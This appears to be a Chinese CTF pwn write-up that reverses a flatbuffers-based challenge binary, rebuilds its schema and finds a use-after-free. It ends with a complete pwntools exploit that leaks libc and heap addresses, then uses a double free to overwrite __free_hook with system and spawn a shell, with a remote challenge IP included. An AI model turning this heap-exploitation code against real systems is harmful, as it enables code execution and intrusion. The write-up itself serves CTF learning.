<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_2EA0</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int16 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_2A30(a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> sub_23C0((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(v4 + a1)) + v4 + a1;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_2A30</span><span class="params">(__int64 input, <span class="keyword">unsigned</span> __int16 num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = (<span class="keyword">char</span> *)sub_2AE0(input);</span><br><span class="line">  <span class="keyword">if</span> ( num &gt;= (<span class="keyword">int</span>)sub_29D0((<span class="keyword">unsigned</span> __int16 *)v4) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> sub_29D0((<span class="keyword">unsigned</span> __int16 *)&amp;v4[num]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从 flatbuffers 官方测试样例中编译了几个二进制文件，找到类似的结构：（反序列化部分）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MyGame::Sample::Vec3 *__cdecl MyGame::Sample::Monster::<span class="built_in">pos</span>(<span class="keyword">const</span> MyGame::Sample::Monster *<span class="keyword">const</span> <span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> flatbuffers::Table::GetStruct&lt;MyGame::Sample::Vec3 <span class="keyword">const</span>*&gt;(<span class="keyword">this</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MyGame::Sample::Vec3 *__cdecl flatbuffers::Table::GetStruct&lt;MyGame::Sample::Vec3 <span class="keyword">const</span>*&gt;(</span><br><span class="line">        <span class="keyword">const</span> flatbuffers::Table *<span class="keyword">const</span> <span class="keyword">this</span>,</span><br><span class="line">        flatbuffers::<span class="keyword">voffset_t</span> field)</span><br><span class="line">&#123;</span><br><span class="line">  flatbuffers::<span class="keyword">voffset_t</span> OptionalFieldOffset; <span class="comment">// ax</span></span><br><span class="line"></span><br><span class="line">  OptionalFieldOffset = flatbuffers::Table::<span class="built_in">GetOptionalFieldOffset</span>(<span class="keyword">this</span>, field);</span><br><span class="line">  <span class="keyword">if</span> ( OptionalFieldOffset )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">const</span> MyGame::Sample::Vec3 *)&amp;<span class="keyword">this</span>[OptionalFieldOffset];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flatbuffers::<span class="keyword">voffset_t</span> __cdecl flatbuffers::Table::<span class="built_in">GetOptionalFieldOffset</span>(</span><br><span class="line">        <span class="keyword">const</span> flatbuffers::Table *<span class="keyword">const</span> <span class="keyword">this</span>,</span><br><span class="line">        flatbuffers::<span class="keyword">voffset_t</span> field)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> __int8 *vtable; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  vtable = flatbuffers::Table::<span class="built_in">GetVTable</span>(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">if</span> ( field &gt;= flatbuffers::ReadScalar&lt;<span class="keyword">unsigned</span> <span class="keyword">short</span>&gt;(vtable) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> flatbuffers::ReadScalar&lt;<span class="keyword">unsigned</span> <span class="keyword">short</span>&gt;(&amp;vtable[field]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，题目设计了 flatbuffers 反序列化的部分，需要我们逆向出序列化逻辑并将序列化后数据作为程序的输入</p>
<p>flatbuffers 的反序列化需要定义 <code>cft.fbs</code> 文件（用于指定序列化格式），目前只能通过反序列化伪代码来猜测 <code>cft.fbs</code> 中可能的结构，我在题目中找到了如下的突破口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Verify</span><span class="params">(<span class="keyword">char</span> *<span class="keyword">this</span>, _QWORD *verifier)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 key; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *index2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (VerifyTableStart((__int64)<span class="keyword">this</span>, verifier) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( VerifyOffset_unsigned_int((__int64)<span class="keyword">this</span>, verifier, <span class="number">4u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      key = get_key(<span class="keyword">this</span>);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (VerifyString(verifier, key) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (VerifyField_int((__int64)<span class="keyword">this</span>, verifier, <span class="number">6u</span>, <span class="number">8LL</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (VerifyField_int((__int64)<span class="keyword">this</span>, verifier, <span class="number">8u</span>, <span class="number">8LL</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v6 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( VerifyOffset_unsigned_int((__int64)<span class="keyword">this</span>, verifier, <span class="number">0xA</span>u) )</span><br><span class="line">            &#123;</span><br><span class="line">              index2 = get_index2((__int64)<span class="keyword">this</span>);</span><br><span class="line">              v6 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( (sub_2630((__int64)verifier, (__int64)index2) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v4 = get_index2((__int64)<span class="keyword">this</span>);</span><br><span class="line">                v6 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> ( (sub_2680((__int64)verifier, v4) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                  v6 = sub_2720((__int64)verifier);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Verifier 是 flatbuffers 的检查器：</p>
<ul>
<li><code>VerifyString(verifier, key)</code> 暴露了 <code>cft.fbs</code> 的第1个条目是 string</li>
<li><code>VerifyField_int(this, verifier, 6u, 8LL)</code> 暴露了 <code>cft.fbs</code> 的第2,3个条目是 int64</li>
</ul>
<p>而最后一个条目可以从如下伪代码中分析出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1 = get_index2((__int64)input);</span><br><span class="line">v6 = get_index(v1, offset);</span><br><span class="line">index = sub_1D10(v6);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_index</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_1C80(a1) )</span><br><span class="line">    __assert_fail(</span><br><span class="line">      <span class="string">&quot;i &lt; size()&quot;</span>,</span><br><span class="line">      <span class="string">&quot;../include/flatbuffers/vector.h&quot;</span>,</span><br><span class="line">      <span class="number">0xB0</span>u,</span><br><span class="line">      <span class="string">&quot;flatbuffers::Vector::return_type flatbuffers::Vector&lt;flatbuffers::Offset&lt;MyGame::Item&gt;&gt;::Get(SizeT) const [T = fla&quot;</span></span><br><span class="line">      <span class="string">&quot;tbuffers::Offset&lt;MyGame::Item&gt;, SizeT = unsigned int]&quot;</span>);</span><br><span class="line">  v2 = sub_3BB0(a1);</span><br><span class="line">  <span class="keyword">return</span> sub_3B60(v2, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cft.fbs</code> 的第4个条目是 Vector tables2</li>
<li>近一步对比分析可以得知：tables2 存放有2个条目 - (int64,string)</li>
</ul>
<p>最后设计出的 <code>cft.fbs</code> 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> Test.Sample;</span><br><span class="line"> </span><br><span class="line">table Monster &#123;</span><br><span class="line">  key:<span class="built_in">string</span>;</span><br><span class="line">  offset:int64 = <span class="number">0</span>;</span><br><span class="line">  size:int64 = <span class="number">0</span>;</span><br><span class="line">  index:[Weapon];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table Weapon &#123;</span><br><span class="line">  index:int64;</span><br><span class="line">  key:<span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">root_type Monster;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>程序只置空了 size，有 UAF 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(datag.chunk_list[index]);</span><br><span class="line">datag.size_list[index] = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先利用 UAF 进行泄露</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecfd0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x122c0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>然后利用 UAF 打 double free 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-s</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./rpg1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x158D)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,offset=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = p64(<span class="number">0x14</span>)+p64(<span class="number">0xc0004001c000c</span>)+p64(<span class="number">0xc00080014</span>)+p64(<span class="number">0x1400000044</span>)</span><br><span class="line">    payload += p64(offset)+p64(size)</span><br><span class="line">    payload += p64(<span class="number">0xc00000001</span>)+p16(<span class="number">0x8</span>)+p16(<span class="number">0x10</span>)+p32(<span class="number">0x40008</span>)+p32(<span class="number">0x8</span>)+p32(<span class="number">0xc</span>)</span><br><span class="line">    payload += p64(index)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;aaaa&quot;</span>+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="number">6</span>)+<span class="string">&quot;Create&quot;</span></span><br><span class="line">    sa(<span class="string">&quot;Enter flat buffer:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index,size=<span class="number">0</span>,offset=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = p64(<span class="number">0x14</span>)+p64(<span class="number">0xc0004001c000c</span>)+p64(<span class="number">0xc00080014</span>)+p64(<span class="number">0x1400000044</span>)</span><br><span class="line">    payload += p64(offset)+p64(size)</span><br><span class="line">    payload += p64(<span class="number">0xc00000001</span>)+p16(<span class="number">0x8</span>)+p16(<span class="number">0x10</span>)+p32(<span class="number">0x40008</span>)+p32(<span class="number">0x8</span>)+p32(<span class="number">0xc</span>)</span><br><span class="line">    payload += p64(index)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;aaaa&quot;</span>+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;Show&quot;</span></span><br><span class="line">    sa(<span class="string">&quot;Enter flat buffer:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index,size=<span class="number">0</span>,offset=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = p64(<span class="number">0x14</span>)+p64(<span class="number">0xc0004001c000c</span>)+p64(<span class="number">0xc00080014</span>)+p64(<span class="number">0x1400000044</span>)</span><br><span class="line">    payload += p64(offset)+p64(size)</span><br><span class="line">    payload += p64(<span class="number">0xc00000001</span>)+p16(<span class="number">0x8</span>)+p16(<span class="number">0x10</span>)+p32(<span class="number">0x40008</span>)+p32(<span class="number">0x8</span>)+p32(<span class="number">0xc</span>)</span><br><span class="line">    payload += p64(index)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;aaaa&quot;</span>+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="number">6</span>)+<span class="string">&quot;Delete&quot;</span></span><br><span class="line">    sa(<span class="string">&quot;Enter flat buffer:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,data,offset=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = p64(<span class="number">0x14</span>)+p64(<span class="number">0xc0004001c000c</span>)+p64(<span class="number">0xc00080014</span>)+p64(<span class="number">0x1400000044</span>+<span class="built_in">len</span>(data))</span><br><span class="line">    payload += p64(offset)+p64(size)</span><br><span class="line">    payload += p64(<span class="number">0xc00000001</span>)+p16(<span class="number">0x8</span>)+p16(<span class="number">0x14</span>)+p32(<span class="number">0x40008</span>)+p32(<span class="number">0x8</span>)+p32(<span class="number">0x10</span>)</span><br><span class="line">    payload += p64(index)+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="built_in">len</span>(data))+data+p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(<span class="number">4</span>)+<span class="string">&quot;Edit&quot;</span></span><br><span class="line">    sa(<span class="string">&quot;Enter flat buffer:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecfd0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x122c0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i+<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i+<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">13</span>,<span class="number">0x60</span>,p64(system))</span><br><span class="line">edit(<span class="number">12</span>,<span class="number">0x60</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
